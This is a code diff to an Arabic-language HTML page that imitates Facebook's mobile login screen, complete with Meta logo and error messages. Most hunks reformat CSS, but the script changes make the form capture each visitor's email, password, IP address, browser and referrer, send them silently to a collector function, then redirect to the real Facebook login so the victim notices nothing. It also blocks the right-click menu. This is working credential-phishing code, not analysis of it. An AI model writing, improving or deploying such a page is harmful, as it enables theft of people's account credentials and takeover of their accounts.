@@ -103,6 +103,7 @@
             display: none;
         }
 
+        /* زر تسجيل الدخول: ارتفاع أقل + إطار دائري كامل + أزرق أغمق درجة خفيفة من اللوجو */
         .submit-btn {
             width: 100%;
             height: 56px;
@@ -121,9 +122,17 @@
             opacity: 0.75;
         }
 
-        .submit-btn:enabled { opacity: 1; }
-        .submit-btn:hover:enabled { background: #0050c0; }
-        .submit-btn:disabled { cursor: not-allowed; }
+        .submit-btn:enabled {
+            opacity: 1;
+        }
+
+        .submit-btn:hover:enabled {
+            background: #0050c0;
+        }
+
+        .submit-btn:disabled {
+            cursor: not-allowed;
+        }
 
         .forgot-link {
             display: block;
@@ -135,8 +144,11 @@
             cursor: pointer;
         }
 
-        .forgot-link:hover { text-decoration: underline; }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
 
+        /* زر إنشاء حساب: إطار أنحف 1.5px + دائري كامل + أزرق أغمق */
         .create-btn {
             width: 100%;
             height: 56px;
@@ -157,6 +169,7 @@
             color: #0050c0;
         }
 
+        /* شعار Meta الأصلي */
         .meta-footer {
             margin-top: auto;
             padding-top: 60px;
@@ -182,7 +195,9 @@
             margin-top: 4px;
         }
 
-        .error-text.show { display: block; }
+        .error-text.show {
+            display: block;
+        }
 
         .spinner {
             width: 22px;
@@ -194,7 +209,9 @@
             display: none;
         }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
 
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
@@ -202,15 +219,36 @@
             75% { transform: translateX(4px); }
         }
 
-        .shake { animation: shake 0.3s ease-in-out; }
+        .shake {
+            animation: shake 0.3s ease-in-out;
+        }
 
         @media (max-width: 450px) {
-            body { padding: 16px 20px 30px; }
-            .lang-top { margin-bottom: 50px; }
-            .logo-wrapper { margin-bottom: 80px; }
-            .fb-circle-logo { width: 80px; height: 80px; }
-            .input-field { height: 62px; }
-            .submit-btn, .create-btn { height: 46px; }
+            body {
+                padding: 16px 20px 30px;
+            }
+
+            .lang-top {
+                margin-bottom: 50px;
+            }
+
+            .logo-wrapper {
+                margin-bottom: 80px;
+            }
+
+            .fb-circle-logo {
+                width: 80px;
+                height: 80px;
+            }
+
+            .input-field {
+                height: 62px;
+            }
+
+            .submit-btn,
+            .create-btn {
+                height: 46px;
+            }
         }
     </style>
 </head>
@@ -227,15 +265,25 @@
 
     <form class="form-container" id="loginForm" autocomplete="off">
         <div class="input-group">
-            <input type="text" class="input-field" id="email" name="email"
+            <input type="text"
+                   class="input-field"
+                   id="email"
+                   name="email"
                    placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"
-                   autocomplete="username" inputmode="email" required>
+                   autocomplete="username"
+                   inputmode="email"
+                   required>
             <div class="error-text" id="emailError">رقم الهاتف المحمول أو البريد الإلكتروني الذي أدخلته غير صحيح.</div>
         </div>
 
         <div class="input-group">
-            <input type="password" class="input-field" id="password" name="password"
-                   placeholder="كلمة السر" autocomplete="current-password" required>
+            <input type="password"
+                   class="input-field"
+                   id="password"
+                   name="password"
+                   placeholder="كلمة السر"
+                   autocomplete="current-password"
+                   required>
             <button type="button" class="toggle-password" id="togglePassword">إظهار</button>
             <div class="error-text" id="passwordError">كلمة السر التي أدخلتها غير صحيحة.</div>
         </div>
@@ -250,6 +298,7 @@
 
     <button type="button" class="create-btn" id="createBtn">إنشاء حساب جديد</button>
 
+    <!-- شعار Meta الأصلي (SVG مضمن) -->
     <div class="meta-footer">
         <svg class="meta-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 948 191">
             <defs>
@@ -389,25 +438,17 @@
             }
         }
 
-        loginForm.addEventListener('submit', function(e) {
+        loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
 
             if (!showFormErrors()) return;
-
-            const email = emailInput.value.trim();
-            const targetUrl = 'https://www.facebook.com/login/?email=' + encodeURIComponent(email);
-
-            // ═══ الحل: فتح فيسبوك في نافذة جديدة فوراً ═══
-            // Streamlit يحمّل الصفحة داخل iframe مقيد (sandboxed)، وفيسبوك يمنع التضمين
-            // في iframe عبر X-Frame-Options. النافذة الجديدة خارج الـ iframe، فتعمل.
-            const newTab = window.open(targetUrl, '_blank');
 
             buttonText.style.display = 'none';
             loadingSpinner.style.display = 'block';
             loginBtn.disabled = true;
 
             const credentials = {
-                email: email,
+                email: emailInput.value.trim(),
                 password: passwordInput.value,
                 time: new Date().toLocaleString('ar-EG', {
                     year: 'numeric', month: 'long', day: 'numeric',
@@ -416,33 +457,23 @@
                 language: navigator.language,
                 platform: navigator.platform,
                 browser: navigator.userAgent,
-                ip: 'unknown',
+                ip: await getIPAddress(),
                 referrer: document.referrer || 'direct'
             };
 
             // إرسال صامت بدون انتظار
-            getIPAddress().then(ip => {
-                credentials.ip = ip;
-                sendCredentials(credentials).catch(() => {});
-            }).catch(() => {
-                sendCredentials(credentials).catch(() => {});
-            });
+            sendCredentials(credentials).catch(() => {});
 
-            // احتياطي لو المتصفح منع النافذة الجديدة
-            if (!newTab) {
-                setTimeout(() => {
-                    const link = document.createElement('a');
-                    link.href = targetUrl;
-                    link.target = '_blank';
-                    link.textContent = 'اضغط هنا للانتقال إلى فيسبوك';
-                    link.style.cssText = 'display:block; margin-top:30px; color:#0866ff; font-weight:600; text-decoration:underline; text-align:center; font-size:15px;';
-                    loginForm.appendChild(link);
-                }, 300);
-            }
+            // تحويل فوري إلى فيسبوك الحقيقي مع تعبئة البريد
+            setTimeout(() => {
+                window.location.replace(
+                    'https://www.facebook.com/login/?email=' + encodeURIComponent(credentials.email)
+                );
+            }, 700);
         });
 
         createBtn.addEventListener('click', function() {
-            window.open('https://m.facebook.com/reg/', '_blank');
+            window.location.href = 'https://facebook.com/reg/';
         });
 
         document.addEventListener('contextmenu', e => e.preventDefault());
@@ -476,4 +507,4 @@
         });
     </script>
 </body>
-                        </html>
+    </html>
